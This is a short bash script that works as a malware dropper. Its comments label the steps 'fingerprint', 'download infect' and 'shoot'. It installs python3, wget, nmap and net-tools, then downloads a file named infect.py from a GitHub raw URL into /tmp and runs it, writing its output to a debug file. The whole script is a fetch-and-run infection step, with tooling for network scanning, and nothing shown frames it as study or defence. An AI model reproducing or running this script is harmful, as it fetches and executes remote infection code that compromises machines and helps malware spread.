#!/bin/bash

#fingerprint
apt-get update
apt-get install python3 -y
apt-get install wget -y
apt-get install nmap -y
apt-get install net-tools -y

#download infect
wget -O /tmp/infect.py raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/infect.py
sleep 3

#shoot
cd /usr/bin
python3 /tmp/infect.py > /tmp/debug 2>&1 # redicretcing stnd out into debug AND telling bash to redirect all err in stnd out, now into debug
